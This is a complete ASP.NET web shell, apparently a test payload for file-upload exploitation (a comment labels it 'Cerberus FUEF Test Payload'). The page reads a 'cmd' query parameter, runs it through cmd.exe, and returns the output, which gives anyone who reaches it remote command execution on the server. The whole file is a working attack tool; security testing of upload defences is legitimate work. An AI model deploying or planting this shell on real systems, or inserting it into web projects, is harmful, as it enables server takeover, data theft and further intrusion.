<%@ Page Language="C#" %>
<%
    string cmd = Request.QueryString["cmd"];
    if (cmd != null)
    {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
%>
<!-- Cerberus FUEF Test Payload -->
